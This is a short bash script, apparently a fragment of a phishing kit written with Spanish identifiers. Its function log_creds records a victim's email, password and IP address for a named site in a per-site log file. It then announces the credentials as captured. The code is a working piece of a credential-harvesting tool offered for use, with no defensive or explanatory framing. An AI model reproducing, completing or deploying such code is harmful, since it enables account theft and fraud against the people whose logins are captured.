#!/bin/bash
log_creds() {
    local sitio=$1
    local email=$2
    local pass=$3
    local ip=$4
    local fecha=$(date '+%Y-%m-%d %H:%M:%S')
    
    mkdir -p logs
    echo "[$fecha] SITIO: $sitio | IP: $ip | EMAIL: $email | PASS: $pass" >> "logs/${sitio}_creds.log"
    echo -e "${R}[!]${W} Credenciales capturadas y guardadas en logs/${sitio}_creds.log"
}
